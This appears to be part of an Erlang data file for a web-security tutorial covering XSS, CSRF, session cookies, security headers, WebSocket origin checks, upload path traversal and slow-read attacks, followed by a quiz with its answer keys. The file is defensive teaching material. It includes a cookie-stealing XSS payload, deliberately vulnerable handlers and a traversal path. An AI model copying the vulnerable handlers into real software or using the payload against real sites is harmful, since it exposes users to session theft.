                code_examples => [
                    #{
                        title => <<"Vulnerable: unescaped user input in iolist">>,
                        code => <<
                            "render_greeting(Username) ->\n"
                            "    %% DANGEROUS: Username is inserted raw\n"
                            "    [<<\"<h1>Welcome, \">>, Username, <<\"</h1>\">>].\n\n"
                            "%% If Username = <<\"<script>steal(document.cookie)</script>\">>\n"
                            "%% the browser executes the attacker's script."
                        >>,
                        vulnerable => true,
                        explanation => <<
                            "User input is spliced directly into the HTML iolist. "
                            "An attacker can set their username to a script tag and "
                            "steal session cookies from anyone who views the page."
                        >>,
                        output => <<"<h1>Welcome, <script>steal(document.cookie)</script></h1>">>
                    },
                    #{
                        title => <<"Safe: HTML-escaped output with CSP header">>,
                        code => <<
                            "html_escape(Bin) when is_binary(Bin) ->\n"
                            "    html_escape(binary_to_list(Bin));\n"
                            "html_escape([]) -> [];\n"
                            "html_escape([$< | T]) -> [<<\"&lt;\">> | html_escape(T)];\n"
                            "html_escape([$> | T]) -> [<<\"&gt;\">> | html_escape(T)];\n"
                            "html_escape([$& | T]) -> [<<\"&amp;\">> | html_escape(T)];\n"
                            "html_escape([$\" | T]) -> [<<\"&quot;\">> | html_escape(T)];\n"
                            "html_escape([$' | T]) -> [<<\"&#39;\">> | html_escape(T)];\n"
                            "html_escape([H | T]) -> [H | html_escape(T)].\n\n"
                            "render_greeting(Username) ->\n"
                            "    [<<\"<h1>Welcome, \">>, html_escape(Username), <<\"</h1>\">>].\n\n"
                            "%% Set CSP header in Cowboy response\n"
                            "set_security_headers(Req0) ->\n"
                            "    cowboy_req:set_resp_header(\n"
                            "        <<\"content-security-policy\">>,\n"
                            "        <<\"default-src 'self'; script-src 'self'\">>,\n"
                            "        Req0\n"
                            "    )."
                        >>,
                        vulnerable => false,
                        explanation => <<
                            "html_escape converts dangerous characters to HTML entities. "
                            "The CSP header tells the browser to only execute scripts "
                            "from the same origin, blocking inline injections even if "
                            "escaping is missed somewhere."
                        >>,
                        output =>
                            <<"<h1>Welcome, &lt;script&gt;steal(document.cookie)&lt;/script&gt;</h1>">>
                    }
                ]
            },
            #{
                title => <<"CSRF Protection and Session Management">>,
                content => <<
                    "<p><strong>Cross-Site Request Forgery (CSRF)</strong> tricks a logged-in "
                    "user's browser into submitting a state-changing request to your server. "
                    "Prevent this with a per-session token that must accompany every mutating "
                    "request.</p>"
                    "<p>Sessions stored in ETS must be managed carefully:</p>"
                    "<ul>"
                    "<li>Generate session IDs with <code>crypto:strong_rand_bytes/1</code> "
                    "(at least 16 bytes) to prevent guessing.</li>"
                    "<li>Set cookie flags: <strong>HttpOnly</strong> (no JS access), "
                    "<strong>Secure</strong> (HTTPS only), <strong>SameSite=Strict</strong> "
                    "(block cross-origin sends).</li>"
                    "<li>Expire and clean up stale sessions to limit the window of "
                    "session hijacking.</li>"
                    "<li>Never expose raw ETS session data in responses.</li>"
                    "</ul>"
                >>,
                code_examples => [
                    #{
                        title => <<"CSRF token generation and validation">>,
                        code => <<
                            "generate_csrf_token() ->\n"
                            "    base64:encode(crypto:strong_rand_bytes(32)).\n\n"
                            "validate_csrf(Req, SessionId) ->\n"
                            "    case cowboy_req:header(<<\"x-csrf-token\">>, Req) of\n"
                            "        undefined ->\n"
                            "            {error, missing_csrf};\n"
                            "        Token ->\n"
                            "            case ets:lookup(sessions, SessionId) of\n"
                            "                [{_, #{csrf_token := Expected}}] ->\n"
                            "                    %% Constant-time comparison\n"
                            "                    case crypto:hash_equals(Expected, Token) of\n"
                            "                        true -> ok;\n"
                            "                        false -> {error, invalid_csrf}\n"
                            "                    end;\n"
                            "                _ ->\n"
                            "                    {error, no_session}\n"
                            "            end\n"
                            "    end."
                        >>,
                        vulnerable => false,
                        explanation => <<
                            "Tokens are generated with cryptographic randomness. "
                            "Validation uses crypto:hash_equals/2 for constant-time "
                            "comparison, preventing timing side-channel attacks that "
                            "could leak the token byte by byte."
                        >>,
                        output => <<"ok">>
                    },
                    #{
                        title => <<"Secure session cookie and ETS cleanup">>,
                        code => <<
                            "create_session(Req0, UserData) ->\n"
                            "    SessionId = base64url:encode(crypto:strong_rand_bytes(16)),\n"
                            "    CsrfToken = generate_csrf_token(),\n"
                            "    Expiry = erlang:system_time(second) + 3600,\n"
                            "    ets:insert(sessions, {SessionId, #{\n"
                            "        user => UserData,\n"
                            "        csrf_token => CsrfToken,\n"
                            "        expires_at => Expiry\n"
                            "    }}),\n"
                            "    Req1 = cowboy_req:set_resp_cookie(\n"
                            "        <<\"session_id\">>, SessionId, Req0,\n"
                            "        #{http_only => true, secure => true,\n"
                            "          same_site => strict, path => <<\"/\">>,\n"
                            "          max_age => 3600}\n"
                            "    ),\n"
                            "    {Req1, CsrfToken}.\n\n"
                            "%% Periodic cleanup of expired sessions\n"
                            "cleanup_expired() ->\n"
                            "    Now = erlang:system_time(second),\n"
                            "    ets:foldl(\n"
                            "        fun({Id, #{expires_at := Exp}}, Acc) when Exp < Now ->\n"
                            "                ets:delete(sessions, Id),\n"
                            "                Acc + 1;\n"
                            "           (_, Acc) -> Acc\n"
                            "        end,\n"
                            "        0,\n"
                            "        sessions\n"
                            "    )."
                        >>,
                        vulnerable => false,
                        explanation => <<
                            "Session IDs use 16 bytes of cryptographic randomness "
                            "(128 bits of entropy). Cookie flags prevent JavaScript "
                            "access and cross-origin leakage. The cleanup function "
                            "removes expired sessions to limit hijacking windows."
                        >>,
                        output => <<"{Req1, <<\"base64-csrf-token\">>}">>
                    }
                ]
            },
            #{
                title => <<"Secure HTTP Headers and Rate Limiting">>,
                content => <<
                    "<p>HTTP response headers provide critical security controls:</p>"
                    "<ul>"
                    "<li><strong>Strict-Transport-Security</strong> &mdash; forces browsers to "
                    "use HTTPS for all future requests, preventing downgrade attacks.</li>"
                    "<li><strong>X-Frame-Options: DENY</strong> &mdash; prevents your pages "
                    "from being embedded in iframes (clickjacking protection).</li>"
                    "<li><strong>X-Content-Type-Options: nosniff</strong> &mdash; stops browsers "
                    "from guessing content types, which can turn uploads into executable scripts.</li>"
                    "</ul>"
                    "<p>Rate limiting protects API endpoints from brute-force and "
                    "denial-of-service attacks. A simple token-bucket approach using ETS "
                    "works well for single-node deployments.</p>"
                >>,
                code_examples => [
                    #{
                        title => <<"Cowboy security headers middleware">>,
                        code => <<
                            "set_all_security_headers(Req0) ->\n"
                            "    Headers = [\n"
                            "        {<<\"strict-transport-security\">>,\n"
                            "         <<\"max-age=31536000; includeSubDomains\">>},\n"
                            "        {<<\"x-frame-options\">>, <<\"DENY\">>},\n"
                            "        {<<\"x-content-type-options\">>, <<\"nosniff\">>},\n"
                            "        {<<\"content-security-policy\">>,\n"
                            "         <<\"default-src 'self'; script-src 'self'\">>},\n"
                            "        {<<\"referrer-policy\">>, <<\"strict-origin-when-cross-origin\">>}\n"
                            "    ],\n"
                            "    lists:foldl(\n"
                            "        fun({Name, Value}, Req) ->\n"
                            "            cowboy_req:set_resp_header(Name, Value, Req)\n"
                            "        end,\n"
                            "        Req0,\n"
                            "        Headers\n"
                            "    )."
                        >>,
                        vulnerable => false,
                        explanation => <<
                            "Setting all security headers in one function ensures "
                            "consistent application across all responses. This can "
                            "be called from a Nova pre_request plugin or Cowboy "
                            "middleware to apply globally."
                        >>,
                        output => <<"Req with all security headers set">>
                    },
                    #{
                        title => <<"ETS-based rate limiter">>,
                        code => <<
                            "check_rate_limit(ClientIP, MaxRequests, WindowSecs) ->\n"
                            "    Now = erlang:system_time(second),\n"
                            "    Key = {rate, ClientIP},\n"
                            "    case ets:lookup(rate_limits, Key) of\n"
                            "        [{_, Count, WindowStart}]\n"
                            "          when Now - WindowStart < WindowSecs ->\n"
                            "            case Count >= MaxRequests of\n"
                            "                true ->\n"
                            "                    {error, rate_limited};\n"
                            "                false ->\n"
                            "                    ets:update_counter(\n"
                            "                        rate_limits, Key,\n"
                            "                        {2, 1}\n"
                            "                    ),\n"
                            "                    ok\n"
                            "            end;\n"
                            "        _ ->\n"
                            "            ets:insert(rate_limits, {Key, 1, Now}),\n"
                            "            ok\n"
                            "    end."
                        >>,
                        vulnerable => false,
                        explanation => <<
                            "A sliding window rate limiter using ETS counters. "
                            "When the window expires, the entry is replaced. "
                            "This prevents brute-force login attempts and API abuse "
                            "with minimal overhead."
                        >>,
                        output => <<"ok | {error, rate_limited}">>
                    }
                ]
            },
            #{
                title => <<"WebSocket Security and File/Input Safety">>,
                content => <<
                    "<p>WebSockets bypass many browser security controls. Without "
                    "explicit checks, a malicious page can open a WebSocket to your "
                    "server using the victim's cookies.</p>"
                    "<ul>"
                    "<li><strong>Origin checking</strong> &mdash; verify the Origin header "
                    "during the upgrade handshake to block cross-site connections.</li>"
                    "<li><strong>Message size limits</strong> &mdash; unbounded messages can "
                    "exhaust process memory. Set <code>max_frame_size</code> in Cowboy.</li>"
                    "<li><strong>Message rate limiting</strong> &mdash; prevent a single "
                    "client from flooding the server with messages.</li>"
                    "<li><strong>Authentication</strong> &mdash; validate the session during "
                    "upgrade, not just on the initial HTTP request.</li>"
                    "</ul>"
                    "<p>For file uploads and general input:</p>"
                    "<ul>"
                    "<li>Never trust client-supplied filenames. Use <code>filename:basename/1</code> "
                    "to strip path traversal sequences like <code>../../etc/passwd</code>.</li>"
                    "<li>Validate file content type by checking magic bytes, not the extension.</li>"
                    "<li>Validate all input at system boundaries &mdash; reject invalid data early.</li>"
                    "<li>Cowboy uses Erlang ports for socket I/O. A slow client can cause the "
                    "port's internal buffer to fill, blocking the sender process. Attackers can "
                    "exploit this to deadlock your application by intentionally reading slowly.</li>"
                    "</ul>"
                >>,
                code_examples => [
                    #{
                        title => <<"Vulnerable: no origin check on WebSocket upgrade">>,
                        code => <<
                            "websocket_init(Req, State) ->\n"
                            "    %% DANGEROUS: accepts connections from any origin\n"
                            "    {ok, Req, State}."
                        >>,
                        vulnerable => true,
                        explanation => <<
                            "Without origin checking, a malicious website can open "
                            "a WebSocket to your server. The browser sends the "
                            "victim's cookies automatically, giving the attacker "
                            "an authenticated channel."
                        >>,
                        output => <<"Connection accepted from attacker's page">>
                    },
                    #{
                        title => <<"Safe: origin-checked, size-limited, authenticated WebSocket">>,
                        code => <<
                            "websocket_upgrade(Req, Opts) ->\n"
                            "    AllowedOrigins = [<<\"https://myapp.example.com\">>],\n"
                            "    Origin = cowboy_req:header(<<\"origin\">>, Req),\n"
                            "    case lists:member(Origin, AllowedOrigins) of\n"
                            "        false ->\n"
                            "            {ok, cowboy_req:reply(403, Req), Opts};\n"
                            "        true ->\n"
                            "            case authenticate_session(Req) of\n"
                            "                {ok, UserId} ->\n"
                            "                    %% max_frame_size prevents memory exhaustion\n"
                            "                    {cowboy_websocket, Req,\n"
                            "                     #{user_id => UserId, msg_count => 0},\n"
                            "                     #{max_frame_size => 65536}};\n"
                            "                {error, _} ->\n"
                            "                    {ok, cowboy_req:reply(401, Req), Opts}\n"
                            "            end\n"
                            "    end.\n\n"
                            "%% Rate limit incoming WebSocket messages\n"
                            "websocket_handle({text, Msg}, State = #{msg_count := N}) ->\n"
                            "    case N > 100 of\n"
                            "        true ->\n"
                            "            {[{close, 1008, <<\"rate limited\">>}], State};\n"
                            "        false ->\n"
                            "            handle_message(Msg),\n"
                            "            {ok, State#{msg_count => N + 1}}\n"
                            "    end."
                        >>,
                        vulnerable => false,
                        explanation => <<
                            "Origin is checked against an allowlist before upgrade. "
                            "The session is authenticated during the handshake. "
                            "max_frame_size caps individual message size at 64 KB. "
                            "A per-connection counter rate-limits messages."
                        >>,
                        output => <<"WebSocket opened only for authenticated, same-origin clients">>
                    },
                    #{
                        title => <<"Safe: file upload with path traversal prevention">>,
                        code => <<
                            "save_upload(ClientFilename, FileData, UploadDir) ->\n"
                            "    %% Strip path components to prevent traversal\n"
                            "    SafeName = filename:basename(ClientFilename),\n"
                            "    %% Reject dotfiles and empty names\n"
                            "    case SafeName of\n"
                            "        <<>> -> {error, invalid_filename};\n"
                            "        <<\".\", _/binary>> -> {error, invalid_filename};\n"
                            "        _ ->\n"
                            "            %% Validate content type by magic bytes\n"
                            "            case validate_magic_bytes(FileData) of\n"
                            "                {ok, _Type} ->\n"
                            "                    Path = filename:join(UploadDir, SafeName),\n"
                            "                    file:write_file(Path, FileData);\n"
                            "                {error, _} ->\n"
                            "                    {error, invalid_content_type}\n"
                            "            end\n"
                            "    end.\n\n"
                            "validate_magic_bytes(<<16#89, \"PNG\", 13, 10, 26, 10, _/binary>>) ->\n"
                            "    {ok, png};\n"
                            "validate_magic_bytes(<<16#FF, 16#D8, 16#FF, _/binary>>) ->\n"
                            "    {ok, jpeg};\n"
                            "validate_magic_bytes(<<\"%PDF\", _/binary>>) ->\n"
                            "    {ok, pdf};\n"
                            "validate_magic_bytes(_) ->\n"
                            "    {error, unknown_type}."
                        >>,
                        vulnerable => false,
                        explanation => <<
                            "filename:basename/1 strips directory components, "
                            "preventing writes to ../../etc/passwd. Magic byte "
                            "validation ensures the file content matches an allowed "
                            "type regardless of what extension the client claims."
                        >>,
                        output => <<"ok">>
                    },
                    #{
                        title => <<"Cowboy busy-port blocking attack">>,
                        code => <<
                            "%% Attacker opens many connections and reads responses\n"
                            "%% as slowly as possible (e.g. 1 byte/second).\n"
                            "%%\n"
                            "%% Cowboy sends response via port_command to the socket port.\n"
                            "%% When the TCP send buffer fills because the client isn't\n"
                            "%% reading, port_command blocks the sender process.\n"
                            "%%\n"
                            "%% If enough connections are stalled, all acceptor/handler\n"
                            "%% processes block and the server is deadlocked.\n\n"
                            "%% Mitigation: set send_timeout on the socket\n"
                            "start_listener() ->\n"
                            "    cowboy:start_clear(my_http, [{port, 8080}], #{\n"
                            "        env => #{dispatch => Dispatch},\n"
                            "        %% Close connections that can't send within 30s\n"
                            "        idle_timeout => 60000\n"
                            "    }).\n\n"
                            "%% Also limit max concurrent connections\n"
                            "%% and use a reverse proxy (nginx) with its own\n"
                            "%% client-side timeouts as a front layer."
                        >>,
                        vulnerable => false,
                        explanation => <<
                            "Slow-read attacks cause Cowboy's sender processes to "
                            "block on port_command. Setting idle_timeout and using "
                            "a reverse proxy with client timeouts prevents attackers "
                            "from tying up all server processes."
                        >>,
                        output => <<"{ok, Pid}">>
                    }
                ]
            }
        ],
        quiz => [
            #{
                id => <<"web_q1">>,
                type => multiple_choice,
                prompt => <<
                    "What is the primary defence against XSS in Erlang iolist-based "
                    "HTML rendering?"
                >>,
                options => [
                    #{id => <<"a">>, text => <<"Setting X-Frame-Options header">>},
                    #{
                        id => <<"b">>,
                        text => <<"HTML-escaping all user-supplied data before insertion">>
                    },
                    #{id => <<"c">>, text => <<"Using binary_to_term with [safe]">>},
                    #{id => <<"d">>, text => <<"Enabling CORS">>}
                ],
                correct => <<"b">>,
                explanation => <<
                    "When building HTML with iolists, there is no automatic "
                    "escaping. Every piece of user data must be explicitly "
                    "HTML-escaped (converting <, >, &, \", ' to entities) before "
                    "splicing into the iolist. CSP headers provide defence in depth "
                    "but escaping is the primary control."
                >>
            },
            #{
                id => <<"web_q2">>,
                type => multiple_choice,
                prompt => <<
                    "Why should CSRF token comparison use crypto:hash_equals/2 "
                    "instead of the =:= operator?"
                >>,
                options => [
                    #{id => <<"a">>, text => <<"=:= does not work on binaries">>},
                    #{id => <<"b">>, text => <<"crypto:hash_equals/2 is faster">>},
                    #{
                        id => <<"c">>,
                        text => <<"=:= is vulnerable to timing side-channel attacks">>
                    },
                    #{id => <<"d">>, text => <<"crypto:hash_equals/2 handles unicode better">>}
                ],
                correct => <<"c">>,
                explanation => <<
                    "The =:= operator short-circuits on the first differing byte, "
                    "so an attacker can measure response times to discover the "
                    "token one byte at a time. crypto:hash_equals/2 always "
                    "compares all bytes in constant time, preventing this attack."
                >>
            },
            #{
                id => <<"web_q3">>,
                type => multiple_choice,
                prompt => <<
                    "How does a cross-site WebSocket hijacking attack work?"
                >>,
                options => [
                    #{
                        id => <<"a">>,
                        text => <<"The attacker exploits a buffer overflow in Cowboy">>
                    },
                    #{
                        id => <<"b">>,
                        text => <<
                            "A malicious page opens a WebSocket to the target server, "
                            "and the browser sends the victim's cookies automatically"
                        >>
                    },
                    #{id => <<"c">>, text => <<"The attacker intercepts the TLS handshake">>},
                    #{id => <<"d">>, text => <<"WebSockets cannot be hijacked">>}
                ],
                correct => <<"b">>,
                explanation => <<
                    "Unlike XHR/fetch, WebSocket upgrade requests are not "
                    "restricted by CORS. A malicious page can open a WebSocket "
                    "to any server, and the browser attaches cookies automatically. "
                    "The server must check the Origin header to reject cross-site "
                    "connections."
                >>
            },
            #{
                id => <<"web_q4">>,
                type => multiple_choice,
                prompt => <<
                    "What is the correct way to prevent path traversal in "
                    "file uploads?"
                >>,
                options => [
                    #{
                        id => <<"a">>,
                        text => <<"Check that the filename does not contain the string \"..\"">>
                    },
                    #{
                        id => <<"b">>,
                        text => <<"Use filename:basename/1 to strip all directory components">>
                    },
                    #{
                        id => <<"c">>,
                        text => <<"Trust the client-provided Content-Type header">>
                    },
                    #{
                        id => <<"d">>,
                        text => <<"Store files using the original filename without modification">>
                    }
                ],
                correct => <<"b">>,
                explanation => <<
                    "filename:basename/1 reliably strips all directory components "
                    "regardless of encoding tricks. String-matching for \"..\" can "
                    "be bypassed with URL encoding, unicode normalisation, or "
                    "OS-specific path separators. Always use the standard library "
                    "function."
                >>
            }
        ]
    }.
